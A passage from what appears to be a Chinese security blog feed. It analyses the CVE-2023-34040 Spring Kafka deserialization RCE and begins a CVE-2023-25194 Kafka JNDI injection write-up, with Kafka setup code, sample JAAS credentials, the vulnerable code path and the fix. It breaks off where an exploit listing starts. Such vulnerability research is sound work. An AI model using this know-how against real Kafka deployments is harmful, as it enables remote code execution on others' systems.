  <span class="bullet">-</span> <span class="string">&quot;9092:9092&quot;</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">&quot;9094:9094&quot;</span></span><br><span class="line">    <span class="attr">depends_on:</span></span><br><span class="line">      <span class="bullet">-</span> <span class="string">zookeeper</span></span><br><span class="line">    <span class="attr">environment:</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_HOST_NAME:</span> <span class="number">124.222</span><span class="number">.21</span><span class="number">.138</span></span><br><span class="line">      <span class="attr">KAFKA_ZOOKEEPER_CONNECT:</span> <span class="string">zookeeper:2181</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENERS:</span> <span class="string">PLAINTEXT://0.0.0.0:9092,SSL://0.0.0.0:9094</span></span><br><span class="line">      <span class="attr">KAFKA_ADVERTISED_LISTENERS:</span> <span class="string">PLAINTEXT://124.222.21.138:9092,SSL://124.222.21.138:9094</span></span><br><span class="line">      <span class="attr">KAFKA_LISTENER_SECURITY_PROTOCOL_MAP:</span> <span class="string">PLAINTEXT:PLAINTEXT,SSL:SSL</span></span><br><span class="line">      <span class="attr">KAFKA_INTER_BROKER_LISTENER_NAME:</span> <span class="string">PLAINTEXT</span></span><br><span class="line">    <span class="attr">container_name:</span> <span class="string">kafka</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>Spring Kafka 的生产者和消费者可以通过使用 Spring Kafka 提供的 <code>KafkaTemplate</code> 和 &#96;&#96;@KafkaListener&#96; 注解来编写。</p><p>生产者可以使用 <code>KafkaTemplate</code> 来发送消息到 Kafka 集群：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.controller;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.beans.factory.annotation.Autowired;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.core.KafkaTemplate;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.support.SendResult;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.util.concurrent.ListenableFuture;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.PostMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RequestMapping;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.web.bind.annotation.RestController;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> java.time.LocalDateTime;  </span><br><span class="line"><span class="keyword">import</span> java.util.concurrent.ExecutionException;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@RestController</span>  </span><br><span class="line"><span class="meta">@RequestMapping(&quot;/producer&quot;)</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ProducerController</span> &#123;  </span><br><span class="line">    <span class="meta">@Autowired</span>  </span><br><span class="line">    <span class="keyword">private</span> KafkaTemplate&lt;String,String&gt; kafkaTemplate;  </span><br><span class="line">  </span><br><span class="line">    <span class="meta">@PostMapping(&quot;/fireAndForget&quot;)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">fireAndForget</span><span class="params">()</span> &#123;  </span><br><span class="line">        kafkaTemplate.send(KafkaInfo.TOPIC_WELCOME, <span class="string">&quot;fireAndForget:&quot;</span> + LocalDateTime.now());  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>消费者可以使用 <code>@KafkaListener</code> 注解来监听 Kafka 集群中的消息：</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> com.drunkbaby.springkafkatest.consumer;  </span><br><span class="line">  </span><br><span class="line"><span class="keyword">import</span> com.drunkbaby.springkafkatest.common.KafkaInfo;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.kafka.annotation.KafkaListener;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.MessageHeaders;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Headers;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.messaging.handler.annotation.Payload;  </span><br><span class="line"><span class="keyword">import</span> org.springframework.stereotype.Component;  </span><br><span class="line">  </span><br><span class="line"><span class="meta">@Component</span>  </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Consumer</span> &#123;  </span><br><span class="line">    <span class="meta">@KafkaListener(topics = KafkaInfo.TOPIC_WELCOME)</span>  </span><br><span class="line">    <span class="keyword">public</span> String <span class="title function_">consumer2</span><span class="params">(<span class="meta">@Payload</span> String message, <span class="meta">@Headers</span> MessageHeaders headers)</span> &#123;  </span><br><span class="line">        System.out.println(<span class="string">&quot;消费者(注解方式)：收到消息==&gt; &quot;</span>);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  message：&quot;</span> + message);  </span><br><span class="line">        System.out.println(<span class="string">&quot;  headers:&quot;</span>);  </span><br><span class="line">        headers.keySet().forEach(key -&gt; System.out.println(<span class="string">&quot;    &quot;</span> + key + <span class="string">&quot;:&quot;</span> + headers.get(key)));  </span><br><span class="line">        <span class="keyword">return</span> <span class="string">&quot;success&quot;</span>;  </span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>连接成功</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><p>访问 <code>http://localhost:8083/producer/sync</code> 发送一条记录</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/SuccessConnectKafka.png" class><h3 id="构造-payload"><a href="#构造-payload" class="headerlink" title="构造 payload"></a>构造 payload</h3><p>实际影响到的是 Consumer，且 Consumer 要设置 <code>checkDeserExWhenKeyNull</code> 或 <code>checkDeserExWhenValueNull</code> 为 true </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">ConcurrentKafkaListenerContainerFactory&lt;String, Greeting&gt; factory = <span class="keyword">new</span> <span class="title class_">ConcurrentKafkaListenerContainerFactory</span>&lt;&gt;();  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenValueNull(<span class="literal">true</span>);  </span><br><span class="line">factory.getContainerProperties().setCheckDeserExWhenKeyNull(<span class="literal">true</span>);</span><br></pre></td></tr></table></figure><p>payload 参考 <a class="link" href="https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040">https://github.com/Contrast-Security-OSS/Spring-Kafka-POC-CVE-2023-34040<i class="fas fa-external-link-alt"></i></a></p><h2 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h2><p>主要是来看反序列化的部分</p><p>断点会先走到 <code>org.springframework.kafka.listener.ListenerUtils#getExceptionFromHeader</code> 方法，它这里面会获取到 PoC 中的 <code>KEY_DESERIALIZER_EXCEPTION_HEADER</code>，并将其作为 headers</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/key.png" class><p>往下跟进 <code>byteArrayToDeserializationException()</code> 方法，这里就直接到反序列化的部分了，而在反序列化之前做了一次 <code>resolveClass()</code> 的校验。</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/resolveClass.png" class><p>而这里的 <code>resolveClass()</code> 校验是一次性的，这就代表我们可以构造其他的 Payload，如 CC 链等，证实是可以打通的</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/readObject.png" class><p>之后便会进入到对应类的 <code>readObject()</code> 方法</p><h2 id="漏洞修复"><a href="#漏洞修复" class="headerlink" title="漏洞修复"></a>漏洞修复</h2><p><a class="link" href="https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d">https://github.com/spring-projects/spring-kafka/commit/25ac793a78725e2ca4a3a2888a1506a4bfcf0c9d<i class="fas fa-external-link-alt"></i></a></p><p>相当于把这里的 header 头加黑了</p><img src="/2023/11/27/CVE-2023-34040-Kafka-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96-RCE/blackHeader.png" class>]]></content>
    
    
    <summary type="html">CVE-2023-34040 漏洞分析</summary>
    
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/categories/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    
    <category term="漏洞复现" scheme="https://drun1baby.github.io/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/"/>
    
    <category term="Java" scheme="https://drun1baby.github.io/tags/Java/"/>
    
  </entry>
  
  <entry>
    <title>CVE-2023-25194 Kafka Jndi 注入</title>
    <link href="https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/"/>
    <id>https://drun1baby.github.io/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/</id>
    <published>2023-11-27T01:47:37.000Z</published>
    <updated>2023-11-27T01:53:33.978Z</updated>
    
    <content type="html"><![CDATA[<h1 id="CVE-2023-25194-Kafka-Jndi-注入"><a href="#CVE-2023-25194-Kafka-Jndi-注入" class="headerlink" title="CVE-2023-25194 Kafka Jndi 注入"></a>CVE-2023-25194 Kafka Jndi 注入</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>漏洞通告地址：<a class="link" href="https://kafka.apache.org/cve-list.html">https://kafka.apache.org/cve-list.html<i class="fas fa-external-link-alt"></i></a></p><p>需要看的漏洞列表：</p><ul><li>CVE-2022-23305（SQL 注入，后面发现还是 log4j 的问题）</li><li>CVE-2023-25194（JNDI 注入 <a class="link" href="https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md%EF%BC%89">https://github.com/Threekiii/Vulhub-Reproduce/blob/master/Apache%20Kafka%20Clients%20LDAP%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E%20CVE-2023-25194.md）<i class="fas fa-external-link-alt"></i></a></li><li>CVE-2023-34040（反序列化攻击）</li></ul><p>主要是这三个漏洞，其余的一些 CVE-2021 或是 CVE-2022 很多都是受到 log4j 组件的影响</p><h1 id="CVE-2023-25194-JNDI-注入分析"><a href="#CVE-2023-25194-JNDI-注入分析" class="headerlink" title="CVE-2023-25194 JNDI 注入分析"></a>CVE-2023-25194 JNDI 注入分析</h1><h2 id="Apache-Kafka-Clients-Jndi-Injection"><a href="#Apache-Kafka-Clients-Jndi-Injection" class="headerlink" title="Apache Kafka Clients Jndi Injection"></a>Apache Kafka Clients Jndi Injection</h2><h3 id="漏洞描述"><a href="#漏洞描述" class="headerlink" title="漏洞描述"></a>漏洞描述</h3><p>Apache Kafka 是一个分布式数据流处理平台，可以实时发布、订阅、存储和处理数据流。Kafka Connect 是一种用于在 kafka 和其他系统之间可扩展、可靠的流式传输数据的工具。攻击者可以利用基于 SASL JAAS 配置和 SASL 协议的任意 Kafka 客户端，对 Kafka Connect worker 创建或修改连接器时，通过构造特殊的配置，进行 JNDI 注入来实现远程代码执行。</p><h3 id="影响范围"><a href="#影响范围" class="headerlink" title="影响范围"></a>影响范围</h3><p>2.4.0 &lt;&#x3D; Apache Kafka &lt;&#x3D; 3.3.2</p><h3 id="前置知识"><a href="#前置知识" class="headerlink" title="前置知识"></a>前置知识</h3><h4 id="Kafka-是什么"><a href="#Kafka-是什么" class="headerlink" title="Kafka 是什么"></a>Kafka 是什么</h4><p>Kafka 是一个开源的分布式消息系统，Kafka 可以处理大量的消息和数据流，具有高吞吐量、低延迟、可扩展性等特点。它被广泛应用于大数据领域，如日志收集、数据传输、流处理等场景。</p><p>感觉上和 RocketMQ 很类似，主要功能都是用来进行数据传输的。</p><h4 id="Kafka-客户端-SASL-JAAS-配置"><a href="#Kafka-客户端-SASL-JAAS-配置" class="headerlink" title="Kafka 客户端 SASL JAAS 配置"></a>Kafka 客户端 SASL JAAS 配置</h4><p>简单认证与安全层 (SASL, Simple Authentication and Security Layer ) 是一个在网络协议中用来认证和数据加密的构架，在 Kafka 的实际应用当中表现为 JAAS。</p><p>Java 认证和授权服务（Java Authentication and Authorization Service，简称 JAAS）是一个 Java 以用户为中心的安全框架，作为 Java 以代码为中心的安全的补充。总结一下就是用于认证。有趣的是 <strong>Shiro (JSecurity)</strong> 最初被开发出来的原因就是由于当时 JAAS 存在着许多缺点</p><p>参考自 <a class="link" href="https://blog.csdn.net/yinxuep/article/details/103242969">https://blog.csdn.net/yinxuep/article/details/103242969<i class="fas fa-external-link-alt"></i></a> 还有一些细微的配置这里不再展开。动态设置和静态修改 <code>.conf</code> 文件实际上效果是一致的。</p><h5 id="服务端配置"><a href="#服务端配置" class="headerlink" title="服务端配置"></a>服务端配置</h5><p>1、通常在服务器节点下配置服务器 JASS 文件，例如这里我们将其命名为 <code>kafka_server_jaas.conf</code>，内容如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">KafkaServer &#123;</span><br><span class="line">    org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">    username=&quot;eystar&quot;</span><br><span class="line">    password=&quot;eystar8888&quot;</span><br><span class="line">    user_eystar=&quot;eystar8888&quot;</span><br><span class="line">    user_yxp=&quot;yxp-secret&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p><strong>说明：</strong></p><p>username +password 表示 kafka 集群环境各个代理之间进行通信时使用的身份验证信息。</p><p><code>user_eystar=&quot;eystar8888&quot;</code> 表示定义客户端连接到代理的用户信息，即创建一个用户名为 eystar，密码为 eystar8888 的用户身份信息，kafka 代理对其进行身份验证，可以创建多个用户，格式 <code>user_XXX=”XXX”</code></p><p>2、如果处于静态使用中，需要将其加入到 JVM 启动参数中，如下</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> [ <span class="string">&quot;x<span class="variable">$KAFKA_OPTS</span>&quot;</span> ]; <span class="keyword">then</span></span><br><span class="line"></span><br><span class="line">    <span class="built_in">export</span> KAFKA_OPTS=<span class="string">&quot;-Djava.security.auth.login.config=/opt/modules/kafka_2.11-2.0.0/config/kafka_server_jaas.conf&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">fi</span></span><br></pre></td></tr></table></figure><p><a class="link" href="https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config">https://kafka.apache.org/documentation/#brokerconfigs_sasl.jaas.config<i class="fas fa-external-link-alt"></i></a></p><h5 id="客户端配置"><a href="#客户端配置" class="headerlink" title="客户端配置"></a>客户端配置</h5><p>基本同服务端一致，如下步骤</p><p>1、配置客户端 JAAS 文件，命名为 <code>kafka_client_jaas.conf</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">KafkaClient &#123;</span><br><span class="line">        org.apache.kafka.common.security.plain.PlainLoginModule required</span><br><span class="line">        username=&quot;eystar&quot;</span><br><span class="line">        password=&quot;eystar8888&quot;;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>2、JAVA 调用的 Kafka Client 客户端连接时指定配置属性 <code>sasl.jaas.config</code></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">sasl.jaas.config=org.apache.kafka.common.security.plain.PlainLoginModule required \</span><br><span class="line">    username=<span class="string">&quot;eystar&quot;</span> \</span><br><span class="line">password=<span class="string">&quot;eystar8888&quot;</span>;</span><br><span class="line"><span class="comment">// 即配置属性：（后续会讲到也能够动态配置，让我想起了 RocketMQ）</span></span><br><span class="line">Pro.set(“sasl.jaas.config”,”org.apache.kafka.common.security.plain.PlainLoginModule required username=\<span class="string">&quot;eystar\&quot; password=\&quot;eystar8888\&quot;;&quot;</span>;</span><br><span class="line">”);</span><br></pre></td></tr></table></figure><h4 id="Kafka-客户端动态修改-JAAS-配置"><a href="#Kafka-客户端动态修改-JAAS-配置" class="headerlink" title="Kafka 客户端动态修改 JAAS 配置"></a>Kafka 客户端动态修改 JAAS 配置</h4><p>方式一：配置 Properties 属性，可以注意到这一个字段的键名为 <code>sasl.jaas.config</code>，它的格式如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">loginModuleClass controlFlag (optionName=optionValue)*;</span><br></pre></td></tr></table></figure><p>其中的 loginModuleClass 代表认证方式, 例如 LDAP, Kerberos, Unix 认证，可以参考官方文档 <a class="link" href="https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html">https://docs.oracle.com/javase/8/docs/technotes/guides/security/jgss/tutorials/LoginConfigFile.html<i class="fas fa-external-link-alt"></i></a> 其中有一处为 <code>JndiLoginModule</code>，JDK 自带的 loginModule 位于 <code>com.sun.security.auth.module</code></p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/module.png" class><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//安全模式 用户名 密码</span></span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br></pre></td></tr></table></figure><p>方式二：设置系统属性参数</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 指定kafka_client_jaas.conf文件路径 </span></span><br><span class="line"><span class="type">String</span> <span class="variable">confPath</span> <span class="operator">=</span> TestKafkaComsumer.class.getResource(<span class="string">&quot;/&quot;</span>).getPath()+ <span class="string">&quot;/kafka_client_jaas.conf&quot;</span>; </span><br><span class="line">System.setProperty(<span class="string">&quot;java.security.auth.login.config&quot;</span>, confPath);</span><br></pre></td></tr></table></figure><h4 id="实现代码"><a href="#实现代码" class="headerlink" title="实现代码"></a>实现代码</h4><p><strong>消费者</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestComsumer</span> &#123;</span><br><span class="line"></span><br><span class="line">   <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;group.id&quot;</span>, <span class="string">&quot;test_group&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;enable.auto.commit&quot;</span>, <span class="string">&quot;true&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;auto.commit.interval.ms&quot;</span>, <span class="string">&quot;1000&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.deserializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringDeserializer&quot;</span>);</span><br><span class="line">        <span class="comment">// sasl.jaas.config的配置</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        KafkaConsumer&lt;String, String&gt; consumer = <span class="keyword">new</span> <span class="title class_">KafkaConsumer</span>&lt;&gt;(props);</span><br><span class="line">        consumer.subscribe(Arrays.asList(<span class="string">&quot;topic_name&quot;</span>));</span><br><span class="line">        <span class="keyword">while</span> (<span class="literal">true</span>) &#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">                ConsumerRecords&lt;String, String&gt; records = consumer.poll(Duration</span><br><span class="line">                        .ofMillis(<span class="number">100</span>));</span><br><span class="line">                <span class="keyword">for</span> (ConsumerRecord&lt;String, String&gt; record : records)</span><br><span class="line">                    System.out.printf(<span class="string">&quot;offset = %d, partition = %d, key = %s, value = %s%n&quot;</span>,</span><br><span class="line">                            record.offset(), record.partition(), record.key(), record.value());</span><br><span class="line">          </span><br><span class="line">            &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">                e.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    </span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>生产者</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestProduce</span> &#123;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String args[])</span> &#123;</span><br><span class="line"></span><br><span class="line">        <span class="type">Properties</span> <span class="variable">props</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Properties</span>();</span><br><span class="line"></span><br><span class="line">        props.put(<span class="string">&quot;bootstrap.servers&quot;</span>, <span class="string">&quot;192.168.1.176:9092&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;acks&quot;</span>, <span class="string">&quot;1&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;retries&quot;</span>, <span class="number">3</span>);</span><br><span class="line">        props.put(<span class="string">&quot;batch.size&quot;</span>, <span class="number">16384</span>);</span><br><span class="line">        props.put(<span class="string">&quot;buffer.memory&quot;</span>, <span class="number">33554432</span>);</span><br><span class="line">        props.put(<span class="string">&quot;linger.ms&quot;</span>, <span class="number">10</span>);</span><br><span class="line">        props.put(<span class="string">&quot;key.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line">        props.put(<span class="string">&quot;value.serializer&quot;</span>,</span><br><span class="line">                <span class="string">&quot;org.apache.kafka.common.serialization.StringSerializer&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//sasl</span></span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.jaas.config&quot;</span>, <span class="string">&quot;org.apache.kafka.common.security.plain.PlainLoginModule required username=\&quot;usn\&quot; password=\&quot;pwd\&quot;;&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;security.protocol&quot;</span>, <span class="string">&quot;SASL_PLAINTEXT&quot;</span>);</span><br><span class="line">        props.setProperty(<span class="string">&quot;sasl.mechanism&quot;</span>, <span class="string">&quot;PLAIN&quot;</span>);</span><br><span class="line"></span><br><span class="line">        Producer&lt;String, String&gt; producer = <span class="keyword">new</span> <span class="title class_">KafkaProducer</span>&lt;&gt;(props);</span><br><span class="line">        </span><br><span class="line">       <span class="comment">/**</span></span><br><span class="line"><span class="comment">        * ProducerRecord 参数解析 第一个：topic_name为生产者 topic名称,</span></span><br><span class="line"><span class="comment">        * 第二个：对于生产者kafka2.0需要你指定一个key</span></span><br><span class="line"><span class="comment">        * ,在企业应用中，我们一般会把他当做businessId来用，比如订单ID,用户ID等等。 第三个：消息的主要信息</span></span><br><span class="line"><span class="comment">        */</span></span><br><span class="line"></span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">              producer.send(<span class="keyword">new</span> <span class="title class_">ProducerRecord</span>&lt;String, String&gt;(<span class="string">&quot;topic_name&quot;</span>, Integer.toString(i), <span class="string">&quot;message info&quot;</span>));</span><br><span class="line"></span><br><span class="line">        &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">               e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">   &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h3 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h3><p>漏洞触发点其实是在 <code>com.sun.security.auth.module.JndiLoginModule#attemptAuthentication</code> 方法处</p><img src="/2023/11/27/CVE-2023-25194-Kafka-Jndi-%E6%B3%A8%E5%85%A5/lookup.png" class><p>理顺逻辑很容易构造出 EXP</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">import org.apache.kafka.clients.consumer.KafkaConsumer;</span><br><span class="line">import org.apache.kafka.clients.producer.KafkaProducer;</span><br><span class="line"></span><br><span class="line">import 